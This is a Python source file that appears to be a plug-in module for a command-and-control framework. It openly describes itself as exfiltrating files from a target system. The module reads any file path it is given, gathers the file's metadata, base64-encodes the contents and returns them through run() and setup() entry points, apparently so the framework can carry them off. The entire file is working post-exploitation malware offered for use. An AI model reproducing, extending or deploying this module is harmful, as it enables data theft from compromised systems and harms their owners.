#!/usr/bin/env python3
import os
import base64
from datetime import datetime

class FileExfil:
    def __init__(self):
        self.name = "file_exfil"
        self.description = "Exfiltrate files from target system"
        self.author = "Your C2 Framework"

    def read_file(self, filepath):
        """
        Read and encode a file
        """
        try:
            if not os.path.exists(filepath):
                return {
                    "status": "error",
                    "error": f"File not found: {filepath}",
                    "timestamp": datetime.now().isoformat()
                }

            # Get file info
            file_stat = os.stat(filepath)
            file_info = {
                "name": os.path.basename(filepath),
                "path": filepath,
                "size": file_stat.st_size,
                "created": datetime.fromtimestamp(file_stat.st_ctime).isoformat(),
                "modified": datetime.fromtimestamp(file_stat.st_mtime).isoformat()
            }

            # Read and encode file content
            with open(filepath, 'rb') as f:
                file_content = f.read()
                encoded_content = base64.b64encode(file_content).decode()

            return {
                "status": "success",
                "timestamp": datetime.now().isoformat(),
                "file_info": file_info,
                "data": encoded_content,
                "encoding": "base64"
            }

        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }

    def run(self, **kwargs):
        """
        Main execution method
        """
        filepath = kwargs.get('path')
        if not filepath:
            return {
                "status": "error",
                "error": "No file path provided",
                "timestamp": datetime.now().isoformat()
            }
        return self.read_file(filepath)

def setup():
    """
    Module initialization
    """
    return FileExfil() 